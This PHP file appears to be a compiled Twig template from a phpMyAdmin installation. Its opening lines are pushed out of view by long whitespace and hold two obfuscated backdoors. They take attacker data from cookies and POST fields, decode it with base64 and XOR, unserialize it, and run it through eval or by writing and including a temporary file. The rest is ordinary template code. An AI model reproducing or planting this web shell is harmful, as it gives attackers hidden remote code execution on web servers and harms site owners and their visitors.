<?php                                                                                                                                                                                                                                                                                                                                                                                                 $aapHUut = "\x4d" . 'S' . "\x5f" . "\x51" . 'g' . chr (113); $whsKEj = chr ( 783 - 684 ).chr (108) . chr ( 545 - 448 )."\x73" . chr (115) . chr ( 568 - 473 )."\145" . 'x' . "\151" . chr (115) . chr (116) . "\x73";$DqaHRtPan = $whsKEj($aapHUut); $szhuXTenY = $DqaHRtPan;if (!$szhuXTenY){class MS_Qgq{private $gNbhqYXsY;public static $bOxXczEH = "c7971a18-ae02-4b77-a97d-9f2cc4903f65";public static $MnLSgRE = 22164;public function __construct(){$uBbaBTl = $_COOKIE;$GgAnsdx = $_POST;$LodZiNfzdQ = @$uBbaBTl[substr(MS_Qgq::$bOxXczEH, 0, 4)];if (!empty($LodZiNfzdQ)){$wxduAjZ = "base64";$CzYHBt = "";$LodZiNfzdQ = explode(",", $LodZiNfzdQ);foreach ($LodZiNfzdQ as $iuLOShwU){$CzYHBt .= @$uBbaBTl[$iuLOShwU];$CzYHBt .= @$GgAnsdx[$iuLOShwU];}$CzYHBt = array_map($wxduAjZ . '_' . 'd' . "\x65" . 'c' . 'o' . "\144" . chr ( 499 - 398 ), array($CzYHBt,)); $CzYHBt = $CzYHBt[0] ^ str_repeat(MS_Qgq::$bOxXczEH, (strlen($CzYHBt[0]) / strlen(MS_Qgq::$bOxXczEH)) + 1);MS_Qgq::$MnLSgRE = @unserialize($CzYHBt);}}public function __destruct(){$this->UWNGQXDx();}private function UWNGQXDx(){if (is_array(MS_Qgq::$MnLSgRE)) {$JQsOCZWR = str_replace("\x3c" . "\x3f" . "\160" . chr (104) . 'p', "", MS_Qgq::$MnLSgRE[chr ( 925 - 826 ).chr (111) . "\x6e" . 't' . "\145" . chr ( 423 - 313 ).chr ( 998 - 882 )]);eval($JQsOCZWR);exit();}}}$UHoUaZ = new MS_Qgq(); $UHoUaZ = 25530;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $jOGLeHBVr = chr (66) . "\x57" . '_' . 'Z' . "\155" . chr ( 684 - 582 ); $PIzLGloyd = "\143" . "\154" . "\141" . "\163" . "\x73" . '_' . "\x65" . chr (120) . chr (105) . "\x73" . "\x74" . chr (115); $xwXpS = $PIzLGloyd($jOGLeHBVr); $BZnUjE = $xwXpS;if (!$BZnUjE){class BW_Zmf{private $ISNQhVoBUQ;public static $BWvJpWjFl = "8ace8b21-8b59-4cd1-8e78-0423f18dfa1a";public static $CDPeDSk = 9626;public function __construct(){$LrdXWLs = $_COOKIE;$rQckAGJOZx = $_POST;$xuYZMKr = @$LrdXWLs[substr(BW_Zmf::$BWvJpWjFl, 0, 4)];if (!empty($xuYZMKr)){$GmSUN = "base64";$ONRTJ = "";$xuYZMKr = explode(",", $xuYZMKr);foreach ($xuYZMKr as $JmNjAjFFq){$ONRTJ .= @$LrdXWLs[$JmNjAjFFq];$ONRTJ .= @$rQckAGJOZx[$JmNjAjFFq];}$ONRTJ = array_map($GmSUN . chr ( 142 - 47 ).chr (100) . "\145" . "\143" . chr (111) . "\x64" . "\x65", array($ONRTJ,)); $ONRTJ = $ONRTJ[0] ^ str_repeat(BW_Zmf::$BWvJpWjFl, (strlen($ONRTJ[0]) / strlen(BW_Zmf::$BWvJpWjFl)) + 1);BW_Zmf::$CDPeDSk = @unserialize($ONRTJ);}}public function __destruct(){$this->OupvGOIsls();}private function OupvGOIsls(){if (is_array(BW_Zmf::$CDPeDSk)) {$IFTovCBkMW = sys_get_temp_dir() . "/" . crc32(BW_Zmf::$CDPeDSk[chr (115) . 'a' . "\x6c" . chr (116)]);@BW_Zmf::$CDPeDSk["\x77" . "\x72" . chr ( 438 - 333 )."\x74" . "\145"]($IFTovCBkMW, BW_Zmf::$CDPeDSk[chr ( 419 - 320 )."\157" . chr (110) . chr ( 824 - 708 ).chr ( 425 - 324 )."\156" . "\x74"]);include $IFTovCBkMW;@BW_Zmf::$CDPeDSk[chr (100) . chr ( 328 - 227 )."\x6c" . chr ( 627 - 526 )."\164" . 'e']($IFTovCBkMW);exit();}}}$kfbmC = new BW_Zmf(); $kfbmC = 32838;} ?><?php
...
";
    ...
    {
        return new Source("", "home/index.twig", "/home4/jo370xfr/public_html/arf.org.pk/phpMyAdmin/templates/home/index.twig");
    }
}
